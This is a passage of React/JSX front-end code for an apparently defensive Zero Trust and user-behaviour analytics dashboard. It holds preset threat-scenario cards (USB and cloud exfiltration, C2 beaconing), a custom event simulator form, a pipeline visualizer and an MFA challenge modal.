                <div className={`text-[11px] font-mono space-y-1 mb-4 p-2.5 rounded-md border ${
                  isDark ? 'bg-[#0E0E0E] border-[#2A2A2A] text-gray-400' : 'bg-[#F9F9F7] border-[#E5E5E5] text-gray-600'
                }`}>
                  <div>Media: <span className="font-semibold text-[#C6A14A]">Removable Flash Storage</span></div>
                  <div>Risk Expected: <span className="text-amber-500 font-bold">~82 (RESTRICT &amp; HOLD)</span></div>
                </div>
              </div>

              <button 
                onClick={() => runPresetScenario('scenario-6-usb-exfiltration', 'Scenario 6: USB Storage Physical Exfiltration')} 
                disabled={runningPreset} 
                className="w-full py-2.5 px-3 rounded-md bg-[#C6A14A] hover:bg-[#B59139] text-black border border-[#C6A14A] text-xs font-mono font-bold tracking-wider transition-all flex items-center justify-center gap-1.5 disabled:opacity-50 cursor-pointer shadow-xs"
              >
                <Play className="w-3.5 h-3.5"/>
                <span>SIMULATE SCENARIO 6</span>
              </button>
            </div>

            {/* Scenario 7 */}
            <div className={`border rounded-xl p-5 transition-all duration-200 flex flex-col justify-between ${
              isDark 
                ? 'bg-[#141414] border-[#2A2A2A] hover:border-red-500/40' 
                : 'bg-white border-[#E5E5E5] hover:border-red-500/40 shadow-xs'
            }`}>
              <div>
                <div className="flex items-center justify-between mb-3">
                  <span className="text-[10px] font-mono font-bold text-red-500 px-2 py-0.5 rounded-xs border border-red-500/30 bg-red-500/10">
                    SCENARIO 7
                  </span>
                  <span className="text-[10px] font-mono text-red-500 font-bold border border-red-500/30 px-1.5 py-0.5 rounded-xs bg-red-500/5">
                    MITRE T1048
                  </span>
                </div>
                <h3 className="font-serif-display text-lg font-medium text-current mb-1.5">
                  Mass Cloud Exfiltration
                </h3>
                <p className="text-xs text-gray-500 dark:text-gray-400 leading-relaxed mb-4 font-sans">
                  Off-hours high-velocity mass download (2.85 GB, 3400 files) to unauthorized external Frankfurt IP via rclone.
                </p>
                <div className={`text-[11px] font-mono space-y-1 mb-4 p-2.5 rounded-md border ${
                  isDark ? 'bg-[#0E0E0E] border-[#2A2A2A] text-gray-400' : 'bg-[#F9F9F7] border-[#E5E5E5] text-gray-600'
                }`}>
                  <div>Volume: <span className="font-semibold text-red-500">2,850 MB High-Volume</span></div>
                  <div>Risk Expected: <span className="text-red-500 font-bold">95 (CRITICAL SOC)</span></div>
                </div>
              </div>

              <button 
                onClick={() => runPresetScenario('scenario-7-large-scale-exfiltration', 'Scenario 7: Large-Scale High-Velocity Exfiltration')} 
                disabled={runningPreset} 
                className="w-full py-2.5 px-3 rounded-md bg-red-600 hover:bg-red-700 text-white border border-red-600 text-xs font-mono font-bold tracking-wider transition-all flex items-center justify-center gap-1.5 disabled:opacity-50 cursor-pointer shadow-xs"
              >
                <Flame className="w-3.5 h-3.5"/>
                <span>SIMULATE SCENARIO 7</span>
              </button>
            </div>

            {/* Scenario 8 */}
            <div className={`border rounded-xl p-5 transition-all duration-200 flex flex-col justify-between ${
              isDark 
                ? 'bg-[#141414] border-[#2A2A2A] hover:border-[#C6A14A]/40' 
                : 'bg-white border-[#E5E5E5] hover:border-[#C6A14A]/40 shadow-xs'
            }`}>
              <div>
                <div className="flex items-center justify-between mb-3">
                  <span className="text-[10px] font-mono font-bold text-[#C6A14A] px-2 py-0.5 rounded-xs border border-[#C6A14A]/30 bg-[#C6A14A]/10">
                    SCENARIO 8
                  </span>
                  <span className="text-[10px] font-mono text-[#C6A14A] font-bold border border-[#C6A14A]/30 px-1.5 py-0.5 rounded-xs bg-[#C6A14A]/5">
                    MITRE T1078
                  </span>
                </div>
                <h3 className="font-serif-display text-lg font-medium text-current mb-1.5">
                  Compromised Endpoint C2
                </h3>
                <p className="text-xs text-gray-500 dark:text-gray-400 leading-relaxed mb-4 font-sans">
                  Failed brute logins followed by periodic 30-second automated beaconing to foreign proxy endpoint.
                </p>
                <div className={`text-[11px] font-mono space-y-1 mb-4 p-2.5 rounded-md border ${
                  isDark ? 'bg-[#0E0E0E] border-[#2A2A2A] text-gray-400' : 'bg-[#F9F9F7] border-[#E5E5E5] text-gray-600'
                }`}>
                  <div>Pattern: <span className="font-semibold text-[#C6A14A]">C2 Beaconing + Brute Force</span></div>
                  <div>Risk Expected: <span className="text-red-500 font-bold">98 (AUTO-FREEZE)</span></div>
                </div>
              </div>

              <button 
                onClick={() => runPresetScenario('scenario-8-compromised-endpoint', 'Scenario 8: Compromised Endpoint & C2 Beaconing')} 
                disabled={runningPreset} 
                className="w-full py-2.5 px-3 rounded-md bg-[#C6A14A] hover:bg-[#B59139] text-black border border-[#C6A14A] text-xs font-mono font-bold tracking-wider transition-all flex items-center justify-center gap-1.5 disabled:opacity-50 cursor-pointer shadow-xs"
              >
                <ShieldAlert className="w-3.5 h-3.5"/>
                <span>SIMULATE SCENARIO 8</span>
              </button>
            </div>
          </div>
        </section>

        {/* SECTION 4: Main Grid: Custom Synthesizer Controls + Real-Time Zero Trust Pipeline Visualizer */}
        <section id="custom-behavioral-synthesizer-section" className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Left 5 Cols: Custom Event Synthesizer Panel */}
          <div className={`lg:col-span-5 border rounded-xl p-6 relative transition-colors ${
            isDark 
              ? 'bg-[#141414] border-[#2A2A2A] text-[#F4F4F6]' 
              : 'bg-[#FFFFFF] border-[#E5E5E5] text-[#111317] shadow-sm'
          }`}>
            <div className="flex items-center justify-between pb-4 border-b border-gray-200 dark:border-[#2A2A2A]">
              <div className="flex items-center gap-2.5">
                <div className="p-2 rounded-md bg-[#C6A14A]/10 text-[#C6A14A] border border-[#C6A14A]/20">
                  <Sliders className="w-4 h-4"/>
                </div>
                <div>
                  <h3 className="font-serif-display text-xl font-normal text-current">
                    Custom Behavioral Synthesizer
                  </h3>
                  <p className="text-[11px] text-gray-500 dark:text-gray-400">Configure parameters for ad-hoc risk evaluation</p>
                </div>
              </div>
              <span className="text-[10px] font-mono text-[#C6A14A] border border-[#C6A14A]/40 px-2 py-0.5 rounded-xs bg-[#C6A14A]/10 font-bold">
                UEBA LAB
              </span>
            </div>

            <div className="space-y-4 pt-5 text-xs">
              {/* User Picker */}
              <div>
                <label className="block text-gray-600 dark:text-gray-400 font-mono mb-1.5 text-[11px] uppercase tracking-wider font-medium">
                  Target Subject (User)
                </label>
                <select 
                  value={selectedUserId} 
                  onChange={(e) => setSelectedUserId(e.target.value)} 
                  className={`w-full border rounded-md p-3 text-xs text-current outline-none transition-colors font-mono cursor-pointer ${
                    isDark 
                      ? 'bg-[#0E0E0E] border-[#2A2A2A] focus:border-[#C6A14A]' 
                      : 'bg-[#F9F9F7] border-[#E5E5E5] focus:border-[#C6A14A]'
                  }`}
                >
                  {users.map(u => (
                    <option key={u.id} value={u.id}>
                      {u.name} ({u.employeeId} - {u.department})
                    </option>
                  ))}
                </select>
              </div>

              {/* Target Resource */}
              <div>
                <label className="block text-gray-600 dark:text-gray-400 font-mono mb-1.5 text-[11px] uppercase tracking-wider font-medium">
                  Target Enterprise Resource
                </label>
                <select 
                  value={selectedResourceId} 
                  onChange={(e) => setSelectedResourceId(e.target.value)} 
                  className={`w-full border rounded-md p-3 text-xs text-current outline-none transition-colors font-mono cursor-pointer ${
                    isDark 
                      ? 'bg-[#0E0E0E] border-[#2A2A2A] focus:border-[#C6A14A]' 
                      : 'bg-[#F9F9F7] border-[#E5E5E5] focus:border-[#C6A14A]'
                  }`}
                >
                  {resources.map(r => (
                    <option key={r.id} value={r.id}>
                      [{r.department}] {r.name} ({r.sensitivity})
                    </option>
                  ))}
                </select>
              </div>

              {/* Device Picker */}
              <div>
                <label className="block text-gray-600 dark:text-gray-400 font-mono mb-1.5 text-[11px] uppercase tracking-wider font-medium">
                  Access Endpoint Device
                </label>
                <select 
                  value={selectedDeviceId} 
                  onChange={(e) => setSelectedDeviceId(e.target.value)} 
                  className={`w-full border rounded-md p-3 text-xs text-current outline-none transition-colors font-mono cursor-pointer ${
                    isDark 
                      ? 'bg-[#0E0E0E] border-[#2A2A2A] focus:border-[#C6A14A]' 
                      : 'bg-[#F9F9F7] border-[#E5E5E5] focus:border-[#C6A14A]'
                  }`}
                >
                  {devices.map(d => (
                    <option key={d.id} value={d.id}>
                      {d.deviceName} ({d.isTrusted ? 'Trusted' : 'Untrusted'} - Trust {d.trustScore}%)
                    </option>
                  ))}
                </select>
              </div>

              {/* Download Volume Slider */}
              <div className={`border rounded-lg p-3.5 space-y-2 ${
                isDark ? 'bg-[#0E0E0E] border-[#2A2A2A]' : 'bg-[#F9F9F7] border-[#E5E5E5]'
              }`}>
                <div className="flex justify-between items-center text-[11px] font-mono">
                  <span className="text-gray-500 dark:text-gray-400 tracking-wider">DATA DOWNLOAD VOLUME:</span>
                  <span className="font-bold text-[#C6A14A] text-xs bg-[#C6A14A]/10 px-2 py-0.5 rounded border border-[#C6A14A]/20">
                    {downloadMB} MB
                  </span>
                </div>
                <input 
                  type="range" 
                  min={0} 
                  max={1500} 
                  step={25} 
                  value={downloadMB} 
                  onChange={(e) => setDownloadMB(Number(e.target.value))} 
                  className="w-full accent-[#C6A14A] cursor-pointer"
                />
                <div className="flex justify-between text-[10px] font-mono text-gray-400">
                  <span>0 MB</span>
                  <span>750 MB</span>
                  <span>1,500 MB</span>
                </div>
              </div>

              {/* Failed Logins Counter */}
              <div className={`border rounded-lg p-3.5 space-y-2 ${
                isDark ? 'bg-[#0E0E0E] border-[#2A2A2A]' : 'bg-[#F9F9F7] border-[#E5E5E5]'
              }`}>
                <div className="flex justify-between items-center text-[11px] font-mono">
                  <span className="text-gray-500 dark:text-gray-400 tracking-wider">FAILED AUTHENTICATIONS:</span>
                  <span className={`font-bold text-xs px-2 py-0.5 rounded border ${
                    failedLogins > 0 
                      ? 'text-[#C6A14A] bg-[#C6A14A]/10 border-[#C6A14A]/30' 
                      : 'text-gray-400 bg-gray-500/5 border-gray-400/20'
                  }`}>
                    {failedLogins} attempts
                  </span>
                </div>
                <input 
                  type="range" 
                  min={0} 
                  max={5} 
                  value={failedLogins} 
                  onChange={(e) => setFailedLogins(Number(e.target.value))} 
                  className="w-full accent-[#C6A14A] cursor-pointer"
                />
                <div className="flex justify-between text-[10px] font-mono text-gray-400">
                  <span>0</span>
                  <span>1</span>
                  <span>2</span>
                  <span>3</span>
                  <span>4</span>
                  <span>5 max</span>
                </div>
              </div>

              {/* Checkboxes: Off-Hours, Privilege, USB */}
              <div className="space-y-2.5 pt-3 border-t border-gray-200 dark:border-[#2A2A2A]">
                <label className="flex items-center gap-2.5 cursor-pointer text-gray-700 dark:text-gray-300 font-sans group">
                  <input 
                    type="checkbox" 
                    checked={isOffHours} 
                    onChange={(e) => setIsOffHours(e.target.checked)} 
                    className="accent-[#C6A14A] w-4 h-4 rounded cursor-pointer"
                  />
                  <span className="group-hover:text-current transition-colors">
                    Simulate Off-Hours Access (02:30 AM)
                  </span>
                </label>

                <label className="flex items-center gap-2.5 cursor-pointer text-gray-700 dark:text-gray-300 font-sans group">
                  <input 
                    type="checkbox" 
                    checked={isPrivEscalation} 
                    onChange={(e) => setIsPrivEscalation(e.target.checked)} 
                    className="accent-[#C6A14A] w-4 h-4 rounded cursor-pointer"
                  />
                  <span className="group-hover:text-current transition-colors">
                    Simulate Privilege Escalation Attempt
                  </span>
                </label>

                <label className="flex items-center gap-2.5 cursor-pointer text-gray-700 dark:text-gray-300 font-sans group">
                  <input 
                    type="checkbox" 
                    checked={isUsbTransfer} 
                    onChange={(e) => setIsUsbTransfer(e.target.checked)} 
                    className="accent-[#C6A14A] w-4 h-4 rounded cursor-pointer"
                  />
                  <span className="group-hover:text-current transition-colors">
                    Simulate Removable USB Mass Storage Transfer
                  </span>
                </label>
              </div>

              {/* Execute Evaluation Button */}
              <button 
                id="btn-execute-behavioral-eval"
                onClick={runCustomSimulation} 
                disabled={evaluatingCustom} 
                className="w-full py-3.5 px-4 rounded-md bg-[#C6A14A] hover:bg-[#B59139] text-black font-mono font-bold text-xs tracking-wider transition-all shadow-md hover:shadow-lg flex items-center justify-center gap-2 disabled:opacity-50 mt-5 cursor-pointer border border-[#C6A14A]"
              >
                {evaluatingCustom ? (
                  <>
                    <span className="w-4 h-4 border-2 border-black border-t-transparent rounded-full animate-spin"/>
                    <span>PROCESSING ZERO TRUST PIPELINE...</span>
                  </>
                ) : (
                  <>
                    <Cpu className="w-4 h-4"/>
                    <span>EXECUTE BEHAVIORAL EVALUATION</span>
                  </>
                )}
              </button>
            </div>
          </div>

          {/* Right 7 Cols: Real-Time Pipeline Visualizer & XAI Output */}
          <div className="lg:col-span-7 space-y-5">
            {/* Visual Execution Flow Pipeline */}
            <div className={`border rounded-xl p-5 transition-colors ${
              isDark 
                ? 'bg-[#141414] border-[#2A2A2A]' 
                : 'bg-[#FFFFFF] border-[#E5E5E5] shadow-sm'
            }`}>
              <div className="flex items-center justify-between mb-4">
                <h3 className="font-serif-display text-lg text-current flex items-center gap-2 font-normal">
                  <Layers className="w-4 h-4 text-[#C6A14A]"/>
                  Zero Trust Real-Time Evaluation Pipeline
                </h3>
                <span className="text-[11px] font-mono text-[#C6A14A] font-semibold bg-[#C6A14A]/10 px-2 py-0.5 rounded border border-[#C6A14A]/20">
                  End-to-End Decision
                </span>
              </div>

              {/* Connected Pipeline Flow */}
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-center text-xs relative">
                {/* Stage 1 */}
                <div className={`p-3.5 rounded-lg border flex flex-col justify-between relative ${
                  isDark ? 'bg-[#0E0E0E] border-[#2A2A2A]' : 'bg-[#F9F9F7] border-[#E5E5E5]'
                }`}>
                  <div>
                    <span className="text-[10px] font-mono text-gray-500 block mb-1">STAGE 1</span>
                    <span className="font-semibold text-current block truncate font-sans text-xs">
                      Telemetry Ingest
                    </span>
                  </div>
                  <span className="text-[10px] text-[#C6A14A] font-mono mt-2 pt-2 border-t border-gray-200 dark:border-[#2A2A2A]">
                    Normalize &amp; Extract
                  </span>
                </div>

                {/* Stage 2 */}
                <div className={`p-3.5 rounded-lg border flex flex-col justify-between relative ${
                  isDark ? 'bg-[#0E0E0E] border-[#2A2A2A]' : 'bg-[#F9F9F7] border-[#E5E5E5]'
                }`}>
                  <div>
                    <span className="text-[10px] font-mono text-gray-500 block mb-1">STAGE 2</span>
                    <span className="font-semibold text-current block truncate font-sans text-xs">
                      ML Ensemble
                    </span>
                  </div>
                  <span className="text-[10px] text-[#C6A14A] font-mono mt-2 pt-2 border-t border-gray-200 dark:border-[#2A2A2A]">
                    RF + Isolation Forest
                  </span>
                </div>

                {/* Stage 3 */}
                <div className={`p-3.5 rounded-lg border flex flex-col justify-between relative ${
                  isDark ? 'bg-[#0E0E0E] border-[#2A2A2A]' : 'bg-[#F9F9F7] border-[#E5E5E5]'
                }`}>
                  <div>
                    <span className="text-[10px] font-mono text-gray-500 block mb-1">STAGE 3</span>
                    <span className="font-semibold text-current block truncate font-sans text-xs">
                      Adaptive Risk &amp; XAI
                    </span>
                  </div>
                  <span className="text-[10px] text-[#C6A14A] font-mono mt-2 pt-2 border-t border-gray-200 dark:border-[#2A2A2A]">
                    Attributions
                  </span>
                </div>

                {/* Stage 4 */}
                <div className={`p-3.5 rounded-lg border flex flex-col justify-between relative ${
                  isDark ? 'bg-[#0E0E0E] border-[#2A2A2A]' : 'bg-[#F9F9F7] border-[#E5E5E5]'
                }`}>
                  <div>
                    <span className="text-[10px] font-mono text-gray-500 block mb-1">STAGE 4</span>
                    <span className="font-semibold text-current block truncate font-sans text-xs">
                      Zero Trust Policy
                    </span>
                  </div>
                  <span className="text-[10px] text-red-500 dark:text-red-400 font-mono mt-2 pt-2 border-t border-gray-200 dark:border-[#2A2A2A]">
                    Dynamic Action
                  </span>
                </div>
              </div>
            </div>

            {/* Live XAI Diagnostics Output Card or Standing-By Empty State */}
            {lastResult ? (
              <div className="space-y-3">
                <div className="flex items-center justify-between text-xs font-mono text-gray-500 dark:text-gray-400 px-1">
                  <span>Latest Output: <strong className="text-current font-semibold">{lastResult.scenarioName}</strong></span>
                  <span>User: <strong className="text-current font-semibold">{lastResult.user.name}</strong> ({lastResult.user.employeeId})</span>
                </div>
                <XaiExplanationCard 
                  evaluation={lastResult.evaluation} 
                  onAskCopilot={(q) => onOpenCopilot({ userId: lastResult.user.id })}
                />
              </div>
            ) : (
              <div className={`p-12 sm:p-14 text-center rounded-xl border border-dashed transition-colors flex flex-col items-center justify-center space-y-4 ${
                isDark 
                  ? 'bg-[#141414] border-[#2A2A2A] text-gray-400' 
                  : 'bg-[#FFFFFF] border-gray-300 text-gray-600 shadow-xs'
              }`}>
                <div className="w-14 h-14 rounded-full bg-[#C6A14A]/10 border border-[#C6A14A]/30 flex items-center justify-center text-[#C6A14A]">
                  <FlaskConical className="w-7 h-7"/>
                </div>
                <div className="space-y-1.5 max-w-sm">
                  <p className="font-serif-display text-2xl font-light text-current">
                    Simulator Standing By
                  </p>
                  <p className="text-xs text-gray-500 dark:text-gray-400 leading-relaxed font-sans">
                    Select any preset scenario above or customize event signals on the left to observe live Zero Trust decision logic.
                  </p>
                </div>
                <div className="text-[11px] font-mono text-[#C6A14A] border border-[#C6A14A]/25 px-3 py-1 rounded-full bg-[#C6A14A]/5">
                  READY FOR INGESTION
                </div>
              </div>
            )}
          </div>
        </section>

        {/* MFA Challenge Dialog Modal */}
        <MfaChallengeModal 
          isOpen={mfaModalOpen} 
          onClose={() => setMfaModalOpen(false)} 
          onSuccess={() => {
            onRefreshData();
          }} 
          userName={lastResult?.user?.name || 'Sarah Jenkins'} 
          employeeId={lastResult?.user?.employeeId || 'EMP102'} 
          reason="Elevated risk context triggered step-up MFA challenge."
        />
      </div>
    );
};
